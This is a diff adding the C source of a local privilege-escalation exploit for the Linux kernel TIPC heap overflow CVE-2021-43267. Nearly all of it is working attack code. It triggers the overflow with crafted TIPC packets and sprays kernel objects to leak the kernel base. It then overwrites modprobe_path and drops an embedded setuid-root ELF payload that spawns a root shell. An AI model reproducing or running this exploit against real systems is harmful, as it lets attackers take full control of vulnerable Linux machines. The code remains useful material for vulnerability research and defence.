@@ -1,0 +1,753 @@
+/* 
+ * blasty-vs-tipc.c -- by blasty <peter@haxx.in> 
+ * =============================================
+ * Local PoC exploit for CVE-2021-43267 [1]
+ *
+ * I want to see someone make a remote exploit for this.
+ *
+ * Only really tested on my local copy of 5.15. But given that you need the
+ * TIPC module loaded it is unlikely scriptkiddies will have a use for this.
+ *
+ * Exploit is a bit CTF quality. Feel free to send me revised copies. 
+ *
+ * Enjoy!
+ *
+ * -- blasty // 2021-11-25
+ *
+ * [1] https://www.sentinelone.com/labs/tipc-remote-linux-kernel-heap-overflow-
+ *     allows-arbitrary-code-execution/
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <stdarg.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/ipc.h>
+#include <sys/ioctl.h>
+#include <sys/msg.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <time.h>
+#include <unistd.h>
+#include <linux/netlink.h>
+
+// these are offsets for my kernel, not yours
+#define PTM_UNIX98_OPS 0x127f840 // \__ no exported syms, look for xref to str
+#define PTS_UNIX98_OPS 0x127f960 // /   `Couldn't allocate Unix98 ptm driver`
+#define MODPROBE_PATH  0x16500E0 // has symbol
+#define GADGET_WRITE32 0x2c51f5  // 31 c0 48 89 32 c3
+#define GADGET_RET     0x2c51fa  // c3
+
+// good numbers
+#define KEY_SIZE       956
+#define MSG_COUNT      2048
+#define BODY_SIZE      976
+#define SMASH_SIZE     32
+#define TRIES_MAX      8
+#define NEXT_OFFSET    0x8000
+
+// some constants
+#define NODE_ID        0x11223344
+#define MTYPE          0xAB /* Ac1db34v3rz */
+#define SPRAY_TTY_CNT  0x40
+#define TTY_MAGIC      0x5401
+#define TIPC_UDP_PORT  6118
+#define MSG_COPY       040000
+
+// TIPC crap
+#define TIPC_VERSION   2
+
+// user messages
+#define LINK_PROTOCOL  7
+#define LINK_CONFIG    13
+
+// message types
+#define STATE_MSG      0
+#define RESET_MSG      1
+#define ACTIVATE_MSG   2
+#define MSG_CRYPTO     14
+
+// media types
+#define MEDIA_TYPE_UDP 3
+
+// w0
+#define hdr_msg_size(v) ((v) & 0x1ffff)
+#define hdr_size(v) ((v & 0xf) << 21)
+#define hdr_user(v) ((v & 0xf) << 25)
+#define hdr_nonseq(v) ((v & 1) << 20)
+#define hdr_version(v) ((v & 7) << 29)
+
+// w1
+#define hdr_msg_type(v) ((v & 7) << 29)
+
+// w2
+#define hdr_link_level_seq(v) (v & 0xffff)
+
+// w4
+#define hdr_next_send_pkt(v) (v & 0xffff)
+
+// w5
+#define hdr_media_id(v) (v & 0xff)
+#define hdr_session_number(v) ((v & 0xffff) << 16)
+
+// prototypes
+struct message_t {
+    long type;
+    uint8_t body[BODY_SIZE];
+};
+
+// globals
+int g_sockfd = 0;
+struct sockaddr_in g_sockaddr;
+
+// utility
+#define info(fmt, args...) report('$', false, fmt, ## args)
+#define infov(fmt, args...) report('~', false, fmt, ## args)
+#define maybe(fmt, args...) report('?', false, fmt, ## args)
+#define fatal(fmt, args...) report('!', true, fmt, ## args)
+#define info_value64(name, value) infov("%-24s: %016lx", name, value)
+
+void report(char indicator, bool error, const char *fmt, ...) {
+    FILE *stream = (error) ? stderr : stdout;
+    va_list a;
+    va_start(a, fmt);
+    fprintf(stream, "[%c] %s", indicator, (error) ? "ERROR: " : "");
+    vfprintf(stream, fmt, a);
+    fprintf(stream, "\n");
+    va_end(a);
+
+    if (error) {
+        exit(-1); // all errors are fatal
+    }
+}
+
+void usage(char *prog) {
+    printf("usage: %s <interface IP>\n\n", prog);
+}
+
+static inline void write64(uint8_t *p, uint64_t v) {
+    *(uint64_t*)(p) = v;
+}
+
+static inline uint64_t read64(uint8_t *p) {
+    return *(uint64_t*)(p);
+}
+
+#define be32 htonl
+
+// netlink
+int netlink_send(
+    uint16_t type, uint16_t flags, uint32_t seq, 
+    uint8_t* pkt, size_t pkt_len,
+    uint8_t **reply_buf, size_t *reply_sz
+) {
+    int sock_fd;
+    struct sockaddr_nl sa;
+    memset(&sa, 0, sizeof(struct sockaddr_nl));
+    sa.nl_family = AF_NETLINK;
+
+    size_t pkt_full_len = sizeof(struct nlmsghdr) + pkt_len;
+    uint8_t *pkt_full = malloc(pkt_full_len);
+    memset(pkt_full, 0, pkt_full_len); 
+    memcpy(pkt_full + sizeof(struct nlmsghdr), pkt, pkt_len);
+
+    struct nlmsghdr *netlink_hdr = (struct nlmsghdr*)(pkt_full);
+    netlink_hdr->nlmsg_len = pkt_full_len;
+    netlink_hdr->nlmsg_type = type;
+    netlink_hdr->nlmsg_flags = flags;
+    netlink_hdr->nlmsg_seq = seq;
+    netlink_hdr->nlmsg_pid = getpid();
+
+    if ((sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_GENERIC)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    if (bind(sock_fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+        perror("bind");
+        return -1;
+    }
+
+    ssize_t r = sendto(
+        sock_fd, pkt_full, pkt_full_len, 0, 
+        (struct sockaddr*)&sa, sizeof(struct sockaddr_nl)
+    );
+
+    if (r < 0) {
+        perror("sendto");
+        return -1;
+    }
+
+    free(pkt_full);
+
+    if (reply_buf != NULL) {
+        struct msghdr m;
+        memset(&m, 0, sizeof(struct msghdr));
+        m.msg_iovlen = 1;
+        m.msg_iov = malloc(sizeof(struct iovec));
+        m.msg_iov->iov_base = malloc(0x1000);
+        m.msg_iov->iov_len = 0x1000;
+
+        size_t nread;
+
+        if ((nread = recvmsg(sock_fd, &m, 0)) < 0) {
+            goto error;
+        }
+
+        if (m.msg_iovlen != 1) {
+            goto error;
+        }
+
+        *reply_sz = nread;
+        *reply_buf = malloc(*reply_sz);
+        memcpy(*reply_buf, m.msg_iov->iov_base, *reply_sz);
+        free(m.msg_iov->iov_base);
+    }
+
+    close(sock_fd);
+    return 0;
+
+error:
+    close(sock_fd);
+    return -1;
+}
+
+int netlink_enable_tipc_udp(char *str_ip_address) {
+    uint8_t pkt_ctrl[]={
+        0x03, 0x01, 0x00, 0x00, 0x06, 0x00, 0x01, 0x00, 
+        0x10, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x02, 0x00, 
+        0x54, 0x49, 0x50, 0x43, 0x76, 0x32, 0x00, 0x00
+    };
+
+    uint8_t *nl_reply;
+    size_t nl_reply_len = 0;
+    uint32_t ip_addr;
+    uint32_t seq;
+    int r;
+
+    seq = time(NULL);
+
+    ip_addr = inet_addr(str_ip_address);
+    if (ip_addr == INADDR_NONE) {
+        fatal("invalid ip address given");
+    }
+
+    r = netlink_send(
+        NLMSG_MIN_TYPE, (NLM_F_REQUEST | NLM_F_ACK), seq,
+        pkt_ctrl, sizeof(pkt_ctrl), &nl_reply, &nl_reply_len
+    );
+
+    if(r < 0) {
+        fatal("failed to send netlink control message.");
+    }
+
+    if (nl_reply_len == 0) {
+        fatal("did not get netlink control message reply.");
+    }
+
+    if (*(uint32_t*)(nl_reply + 0x10) == 0xfffffffe) {
+        fatal("tipc support not available.");
+    }
+
+    uint16_t nlmsg_type = 0;
+    off_t pos = 0x14;
+
+    while(pos < nl_reply_len - 4) {
+        struct nlattr *attr = (struct nlattr*)(nl_reply + pos);
+        if (attr->nla_type == 1) {
+            nlmsg_type = *(uint16_t*)(nl_reply + pos + 4);
+            break;
+        }
+        pos += attr->nla_len;
+        if ((attr->nla_len % 4) != 0) {
+            pos += 4 - (attr->nla_len % 4);
+        }
+    }
+
+    if (nlmsg_type == 0) {
+        fatal("could not find tipc netlink message type.");
+    }
+
+    uint8_t pkt_tipc_enable_udp[]={
+        0x03, 0x01, 0x00, 0x00, 0x40, 0x00, 0x01, 0x80,
+        0x0d, 0x00, 0x01, 0x00, 0x75, 0x64, 0x70, 0x3a,
+        0x55, 0x44, 0x50, 0x31, 0x00, 0x00, 0x00, 0x00,
+        0x2c, 0x00, 0x04, 0x80, 0x14, 0x00, 0x01, 0x00,
+        0x02, 0x00, 0x17, 0xe6, 0x00, 0x00, 0x00, 0x00, // <-- +0x24 = ip
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x14, 0x00, 0x02, 0x00, 0x02, 0x00, 0x17, 0xe6,
+        0xe4, 0x00, 0x12, 0x67, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00
+    };
+
+    *(uint32_t*)(pkt_tipc_enable_udp + 0x24) = ip_addr;
+
+    r = netlink_send(
+        nlmsg_type, (NLM_F_REQUEST | NLM_F_ACK), seq, 
+        pkt_tipc_enable_udp, sizeof(pkt_tipc_enable_udp), NULL, NULL
+    );
+
+    if (r < 0) {
+        fatal("failed to send netlink tipc udp enable message.");
+    }
+
+    // the right way is to read back a netlink reply and check if this worked..
+    // I chose to go with the scientifically proven method of big chillin'
+    sleep(2);
+
+    return 0;
+}
+
+// tipc packet routines
+void gen_tipc_hdr(
+    uint8_t *o,
+    uint32_t w0, uint32_t w1, uint32_t w2, 
+    uint32_t w3, uint32_t w4, uint32_t w5
+) {
+    uint32_t* o32 = (uint32_t*)o;
+    o32[0] = be32(w0);
+    o32[1] = be32(w1);
+    o32[2] = be32(w2);
+    o32[3] = be32(w3);
+    o32[4] = be32(w4);
+    o32[5] = be32(w5);
+}
+
+ssize_t tipc_send(uint8_t *buf, size_t sz) {
+    return sendto(
+        g_sockfd, buf, sz, 0, (struct sockaddr*)&g_sockaddr, sizeof(g_sockaddr)
+    );
+}
+
+void tipc_discover() {
+    uint32_t w0, w1, w2, w3, w4, w5;
+    uint8_t pkt[24];
+    w0 = 0;
+    w0 |= hdr_version(TIPC_VERSION);
+    w0 |= hdr_size(6);
+    w0 |= hdr_msg_size(24);
+    w0 |= hdr_user(LINK_CONFIG);
+    w0 |= hdr_nonseq(1);
+    w1 = 0;
+    w2 = 0;
+    w3 = NODE_ID;
+    w4 = 0x1267;
+    w5 = hdr_media_id(MEDIA_TYPE_UDP);
+    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);
+    tipc_send(pkt, sizeof(pkt));
+}
+
+void tipc_link_state_a(uint32_t ip) {
+    uint8_t pkt[56];
+    uint32_t *body = (uint32_t*)(pkt + 24);
+    uint32_t w0, w1, w2, w3, w4, w5;
+
+    memset(pkt, 0, sizeof(pkt));
+
+    w0 = hdr_version(TIPC_VERSION);
+    w0 |= hdr_size(10);
+    w0 |= hdr_user(LINK_PROTOCOL);
+    w0 |= hdr_msg_size(56);
+    w1 = hdr_msg_type(RESET_MSG);
+    w2 = hdr_link_level_seq(0x8000);
+    w3 = NODE_ID;
+    w4 = hdr_next_send_pkt(1);
+    w5 = hdr_session_number(50388);
+    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);
+
+    int pos = 0;
+    body[pos++] = be32(NODE_ID);
+    body[pos++] = be32(ip);
+    body[pos++] = 0;
+    body[pos++] = be32(3500 << 16);
+    memcpy(body + 4, "UDP1", 4);
+    tipc_send(pkt, sizeof(pkt));
+}
+
+void tipc_link_state_b(uint32_t ip) {
+    uint8_t pkt[44];
+    uint32_t w0, w1, w2, w3, w4, w5;
+    uint32_t *body = (uint32_t*)(pkt + 24);
+
+    memset(pkt, 0, sizeof(pkt));
+
+    w0 = hdr_version(TIPC_VERSION);
+    w0 |= hdr_size(10);
+    w0 |= hdr_user(LINK_PROTOCOL);
+    w0 |= hdr_msg_size(44);
+    w1 = hdr_msg_type(STATE_MSG);
+    w2 = hdr_link_level_seq(1);
+    w3 = NODE_ID;
+    w4 = hdr_next_send_pkt(1);
+    w5 = hdr_session_number(50388);
+
+    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);
+
+    int pos = 0;
+    body[pos++] = be32(NODE_ID);
+    body[pos++] = be32(ip);
+    body[pos++] = 0; // timestamp
+    body[pos++] = 0; // max pkt/link tolerance
+    body[pos++] = 0; // bearer instance
+    tipc_send(pkt, sizeof(pkt));
+}
+
+int tipc_link_setup(char *host) {
+    if ((g_sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
+        perror("socket");
+        return -1;
+    }
+
+    memset((char *) &g_sockaddr, 0, sizeof(g_sockaddr));
+    g_sockaddr.sin_family = AF_INET;
+    g_sockaddr.sin_port = htons(TIPC_UDP_PORT);
+
+    if (inet_aton(host, &g_sockaddr.sin_addr) == 0) {
+        perror("inet_aton");
+        return -1;
+    }
+
+    tipc_discover();
+    tipc_link_state_a(be32(inet_addr(host)));
+    tipc_link_state_b(be32(inet_addr(host)));
+
+    return 0;
+}
+
+void tipc_trigger(uint8_t *smashbuf, uint32_t smashlen, int seqno) {
+    uint8_t pkt[0x1000];
+    uint32_t w0, w1, w2, w3, w4, w5;
+
+    w0 = hdr_version(TIPC_VERSION);
+    w0 |= hdr_size(6);
+    w0 |= hdr_user(MSG_CRYPTO);
+    w0 |= hdr_msg_size(24 + 36 + KEY_SIZE);
+    w1 = 0;
+    w2 = seqno;
+    w3 = NODE_ID;
+    w4 = 0;
+    w5 = 0;
+
+    memset(pkt, 0, sizeof(pkt));
+    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);
+
+    memcpy(pkt+24, "HAXX", 4);
+    *(uint32_t*)(pkt+24+32) = be32(KEY_SIZE + SMASH_SIZE + smashlen);
+    memset(pkt+24+36, 'C', KEY_SIZE);
+    memset(pkt+24+36+KEY_SIZE, 'D', SMASH_SIZE);
+    memcpy(pkt+24+36+KEY_SIZE + SMASH_SIZE, smashbuf, smashlen);
+    tipc_send(pkt, sizeof(pkt));
+}
+
+int setup_modprobe_hax() {
+    // small ELF file matroshka doll that does;
+    //   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
+    //   write(fd, elfcode, elfcode_len)
+    //   chmod("/tmp/sh", 04755)
+    //   close(fd);
+    //   exit(0);
+    //
+    // the dropped ELF simply does:
+    //   setuid(0);
+    //   setgid(0);
+    //   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
+    unsigned char elfcode[] = {
+        0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
+        0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
+        0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
+        0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
+        0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
+        0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
+        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
+        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
+        0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
+        0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
+        0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+        0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
+        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
+        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
+        0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
+        0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
+        0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
+    };
+
+    FILE *fp;
+
+    fp = fopen("/tmp/benign", "wb");
+    if (fp == NULL) {
+        perror("fopen");
+        return -1;
+    }
+
+    if (fwrite("\xff\xff\xff\xff", 4, 1, fp) < 1) {
+        perror("fwrite");
+        return -1;
+    }
+    fclose(fp);
+
+    fp = fopen("/tmp/hax", "wb");
+    if (fp == NULL) {
+        perror("fopen");
+        return -1;
+    }
+
+    if (fwrite(elfcode, sizeof(elfcode), 1, fp) < 1) {
+        perror("fwrite");
+        return -1;
+    }
+    fclose(fp);
+
+    if (chmod("/tmp/benign", 0777) < 0) {
+        perror("chmod");
+        return -1;
+    }
+
+    if (chmod("/tmp/hax", 0777) < 0) {
+        perror("chmod");
+        return -1;
+    }
+
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    uint64_t pty_ops = 0;
+    uint64_t mybuf = 0;
+    uint64_t kernel_base = 0;
+
+    uint8_t fake_tty[0x20];
+    uint8_t peekbuf[0x2000];
+
+    int peek_cnt = 1;
+    int seqno=0;
+
+    int tty_fds[SPRAY_TTY_CNT];
+    int queue_id[MSG_COUNT];
+    int queue_id_final = 0;
+
+    struct message_t dummy;
+    dummy.type = MTYPE;
+    memset(dummy.body, 0x58, BODY_SIZE);
+
+    fprintf(stdout,
+        "\n"
+        "      $$$ Linux 5.10-5.15 CVE-2021-43267 exploit  $$$\n"
+        "              -- by blasty <peter@haxx.in> --\n\n"
+    );
+
+    if (argc != 2) {
+        usage(argv[0]);
+        return -1;
+    }
+
+    info("enabling tipc udp media");
+    if (netlink_enable_tipc_udp(argv[1]) < 0) {
+        fatal("failed to enable tipc udp media");
+    }
+
+    info("establish tipc link");
+    if (tipc_link_setup(argv[1]) < 0) {
+        fatal("failed to establish tipc link");
+    }
+
+    info("installing helpers");
+    if (setup_modprobe_hax() < 0) {
+        fatal("failed to setup helpers");
+    }
+
+    info("create messages queues");
+    if ((queue_id_final = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
+        perror("msgget");
+        fatal("failed to create message queue");
+    }
+
+    for(int i = 0; i < MSG_COUNT; i++) {
+        if ((queue_id[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
+            perror("msgget");
+            fatal("failed to create message queue %d", i);
+        }
+    }
+
+    info("spray messages");
+    for(int i = 0; i < MSG_COUNT; i++) {
+        if (msgsnd(queue_id[i], (void*)&dummy, BODY_SIZE, 0) < 0) {
+            perror("msgsnd");
+            fatal("failed to create message in queue %d", i);
+        }
+    }
+
+    info("poking holes");
+    for(int i = 0; i < MSG_COUNT; i += 2) {
+        if(msgrcv(queue_id[i], (void*)&dummy, BODY_SIZE, MTYPE, 0) < 0) {
+            perror("msgrcv");
+            fatal("failed to peek message in queue %d", i);
+        }
+    }
+
+    info("tipc bug trigger");
+
+    uint64_t hacked_msg[4]={
+        0,      // m_list.prev
+        0,      // m_list.next
+        MTYPE,  // m_type
+        0x2000, // m_ts
+    };
+
+    tipc_trigger((uint8_t*)hacked_msg, 0x20, ++seqno);
+
+    info("spraying tty_struct\n");
+    for(int i = 0; i < SPRAY_TTY_CNT; i++) {
+        if ((tty_fds[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0) {
+            fatal("failed to spray tty_struct %d/%d", i, MSG_COUNT);
+        }
+    }
+
+    for(int i = MSG_COUNT-1; i > 0; i--, peek_cnt++) {
+        int r = msgrcv(
+            queue_id[i], (void*)peekbuf, 0x2000, 0, MSG_COPY | IPC_NOWAIT
+        );
+
+        if (r < 0 || r == BODY_SIZE) {
+            continue;
+        }
+
+        info("we corrupted a msg_msg size field! (took %d peeks)\n", peek_cnt);
+
+        for(int j = 0; j < r; j += 4) {
+            if (*(uint32_t*)(peekbuf + j) != TTY_MAGIC) {
+                continue;
+            }
+
+            info("found tty_struct at offset 0x%x", j);
+            pty_ops = read64(peekbuf + j + 0x18);
+            mybuf = read64(peekbuf + j + 0x40) - 0x408;
+
+            info_value64("pty_ops", pty_ops);
+            info_value64("our buffer", mybuf);
+
+            memcpy(fake_tty, peekbuf + j, 0x20);
+            write64(fake_tty + 0x18, mybuf + NEXT_OFFSET);
+
+            // did we hit a master of slave ops ptr?
+            switch(pty_ops & 0xfff) {
+                case PTM_UNIX98_OPS & 0xfff:
+                    kernel_base = pty_ops - PTM_UNIX98_OPS;
+                break;
+
+                case PTS_UNIX98_OPS & 0xfff:
+                    kernel_base = pty_ops - PTS_UNIX98_OPS;
+                break;
+
+                default:
+                    fatal("this should never happen tbh");
+                break;
+            }
+
+            info_value64("kernel base", kernel_base);
+            break;
+        }
+
+        if (pty_ops != 0) {
+            break;
+        } else {
+            info("too bad, tty_struct didnt follow corrupted msg_msg.");
+        }
+    }
+
+    if (pty_ops == 0) {
+        for(int i =0; i < SPRAY_TTY_CNT; i++) {
+            close(tty_fds[i]);
+        }
+
+        fatal("infoleak failed. try again?");
+    }
+
+    info_value64("modprobe_path", kernel_base + MODPROBE_PATH);
+
+    dummy.type = MTYPE;
+    for(int i = 0; i < BODY_SIZE; i+=8) {
+        write64(dummy.body + i, kernel_base + GADGET_RET);
+    }
+    write64(dummy.body + 0x60, kernel_base + GADGET_WRITE32);
+
+    info("spray fake pty ops vtable");
+    for(int i = 0; i < MSG_COUNT; i++) {
+        for(int j = 0; j < 8; j++) {
+            if (msgsnd(queue_id[i], (void*)&dummy, BODY_SIZE, 0) < 0) {
+                perror("msgsnd");
+                fatal("failed to create message %d", i);
+            }
+        }
+    }
+
+    int hacked = 0;
+
+    dummy.type = MTYPE;
+    for(int try = 0; try < TRIES_MAX; try++) {
+        info("attempting to corrupt tty_struct (try %d)", try);
+
+        if (msgsnd(queue_id_final, (void*)&dummy, BODY_SIZE, 0) < 0) {
+            perror("msgsnd");
+            fatal("failed to create message");
+        }
+
+        if ((tty_fds[0] = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0) {
+            fatal("failed to alloc tty_struct");
+        }
+
+        if(msgrcv(queue_id_final, (void*)&dummy, BODY_SIZE, MTYPE, 0) < 0) {
+            perror("msgrcv");
+            fatal("failed to receive message");
+        }
+
+        tipc_trigger(fake_tty, 0x20, ++seqno);
+
+        int r = 0;
+        r = ioctl(tty_fds[0], 0x706d742f, kernel_base + MODPROBE_PATH);
+        if (r == 0) {
+            info("maybe I have some good news..");
+            r = ioctl(tty_fds[0], 0x7861682f, kernel_base + MODPROBE_PATH + 4);
+            hacked = 1;
+            break;
+        } else {
+            close(tty_fds[0]);
+        }
+    }
+
+    if (!hacked) {
+        fatal("hacking computer failed.");
+    } 
+
+    info("triggering modprobe\n");
+    system("/tmp/benign");
+    sleep(1);
+
+    info("popping shell\n");
+    system("/tmp/sh");
+
+    for(int j = 0; j < SPRAY_TTY_CNT; j++) {
+        close(tty_fds[j]);
+    }
+
+    return 0;
+}
